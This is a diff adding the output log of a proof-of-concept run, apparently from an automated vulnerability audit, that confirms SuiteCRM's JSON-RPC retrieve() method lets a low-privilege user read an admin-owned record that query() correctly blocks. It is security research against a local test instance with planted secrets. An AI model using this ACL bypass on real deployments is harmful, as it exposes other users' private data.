@@ -1,0 +1,23 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-001/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-001/../.venv
+========================================================================
+VULN-001: JSON-RPC retrieve() IDOR -- read any record with no ACL
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web session
+[SETUP] create fresh low-privilege user
+[OK] low-priv user: mod_5c265405 id=d55ed419-15e2-4e6d-9660-ecf7efa5668d
+[SETUP] restrict Opportunities view+list = NONE for a fresh Role, assign ONLY to this user (models a real Security-Groups/Role-restricted deployment)
+[OK] role 961ddd3e-1664-4806-b455-ed6cfea3a183 created and assigned (DB rows in acl_roles/acl_roles_actions/acl_roles_users)
+[SETUP] admin creates a victim Opportunity via legacy REST set_entry (admin-owned, secret marker)
+[OK] victim Opportunity id=50a8963f-0cbd-44ce-aabf-aab3456562ff name='Stage10 VULN-001 target n_c1fd284e' description='CVEHUNTER-SECRET-opp_eeb3c181' (owned by admin)
+[INFO] DB-verified opportunities row: {'id': '50a8963f-0cbd-44ce-aabf-aab3456562ff', 'name': 'Stage10 VULN-001 target n_c1fd284e', 'description': 'CVEHUNTER-SECRET-opp_eeb3c181'}
+[SETUP] low-priv user logs in fresh (web session) -- ACL cache computed AFTER the role exists
+[STEP] JSON-RPC method=query (ACL'd sibling) for the victim record, as low-priv
+[INFO] query() HTTP 200, body='{"id":"1","result":{"list":[]}}'
+[PROOF] ACL'd query(): secret present in response = False (expected False -- ACLAccess('ListView') should block it)
+[STEP] JSON-RPC method=retrieve (VULNERABLE sink) for the SAME victim record, SAME low-priv session
+[INFO] retrieve() HTTP 200, module='Stage10 VULN-001 target n_c1fd284e', returned description='CVEHUNTER-SECRET-opp_eeb3c181'
+[PROOF] low-priv user (Opportunities view=NONE, list=NONE via Role 961ddd3e-1664-4806-b455-ed6cfea3a183) -- query()=BLOCKED (0 rows / no secret); retrieve()=LEAKED FULL RECORD
+[OK] Confirmed: retrieve() bypasses the exact ACL restriction that query() (same endpoint family, same low-priv session) correctly enforces.
+==> VULN-001: CONFIRMED — low-priv user w/ Opportunities view=list=NONE read admin-owned Opportunity 50a8963f-0cbd-44ce-aabf-aab3456562ff via JSON-RPC retrieve(); leaked description == planted secret 'CVEHUNTER-SECRET-opp_eeb3c181'; query() on the same record via the same session returned nothing
